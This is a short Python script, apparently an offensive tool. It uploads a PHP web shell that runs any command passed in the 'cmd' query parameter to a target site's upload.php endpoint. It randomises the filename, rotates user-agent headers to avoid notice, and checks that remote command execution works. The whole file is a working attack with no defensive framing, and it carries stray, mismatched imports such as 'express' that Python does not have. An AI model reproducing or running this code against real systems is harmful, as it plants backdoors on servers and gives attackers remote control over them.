import customtkinter 
import os 
import express 
import requests
import random
import string
import time

def generate_filename():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}.php"

def stealth_headers():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "curl/7.68.0",
        "python-requests/2.25.1",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
    ]
    return {
        "User-Agent": random.choice(agents),
        "Accept": "*/*",
        "Connection": "close",
    }

def upload_webshell(target_url):
    shell_name = generate_filename()
    shell_code = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
    files = {
        'file': (shell_name, shell_code, 'application/x-php')
    }

    try:
        upload_url = f"{target_url.rstrip('/')}/upload.php"
        r = requests.post(upload_url, files=files, headers=stealth_headers(), timeout=10)

        if r.status_code in [200, 201]:
            shell_url = f"{target_url.rstrip('/')}/uploads/{shell_name}"
            time.sleep(1.5)  # simulate real delay
            check = requests.get(f"{shell_url}?cmd=echo%20pong", headers=stealth_headers(), timeout=8)
            if "pong" in check.text:
                return {"status": "success", "url": shell_url}
        return {"status": "failed"}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}
